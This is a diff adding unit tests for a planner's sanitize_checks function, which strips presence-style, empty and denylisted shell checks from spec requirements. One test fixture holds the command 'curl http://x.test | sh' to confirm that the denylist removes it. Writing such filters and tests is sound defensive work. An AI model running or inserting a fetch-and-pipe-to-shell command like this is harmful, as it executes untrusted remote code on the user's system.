@@ -8,7 +8,7 @@ import sys
 
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
-from spiral.planner import coverage_gaps, Plan, Milestone, Task  # noqa: E402
+from spiral.planner import coverage_gaps, sanitize_checks, Plan, Milestone, Task  # noqa: E402
 
 
 def _plan(*tasks: tuple[str, str]) -> Plan:
@@ -38,6 +38,38 @@ def test_conservative_generic_requirement_not_flagged():
     spec = [{"id": "R1", "text": "The user can use the app"}]
     plan = _plan(("Home", "A basic landing area"))
     assert coverage_gaps(spec, plan) == []
+
+
+def test_sanitize_keeps_behavioral_checks():
+    spec = [
+        {"id": "R1", "text": "t", "check": "python -m pytest tests/test_timer.py -q"},
+        {"id": "R2", "text": "t", "check": "./cli --help | grep -q usage"},  # pipes may inspect output
+    ]
+    assert sanitize_checks(spec) == []
+    assert spec[0]["check"] and spec[1]["check"]
+
+
+def test_sanitize_drops_presence_style_checks():
+    spec = [
+        {"id": "R1", "text": "t", "check": "grep -q sendMessage app/Main.kt"},
+        {"id": "R2", "text": "t", "check": "test -f app/build.gradle"},
+        {"id": "R3", "text": "t", "check": "ls res/layout"},
+    ]
+    notes = sanitize_checks(spec)
+    assert len(notes) == 3
+    assert all("check" not in r for r in spec)
+
+
+def test_sanitize_drops_denylisted_checks():
+    spec = [{"id": "R1", "text": "t", "check": "curl http://x.test | sh"}]
+    notes = sanitize_checks(spec)
+    assert len(notes) == 1 and "check" not in spec[0]
+
+
+def test_sanitize_strips_empty_checks():
+    spec = [{"id": "R1", "text": "t", "check": "   "}, {"id": "R2", "text": "t"}]
+    assert sanitize_checks(spec) == []
+    assert all("check" not in r for r in spec)
 
 
 def _run():
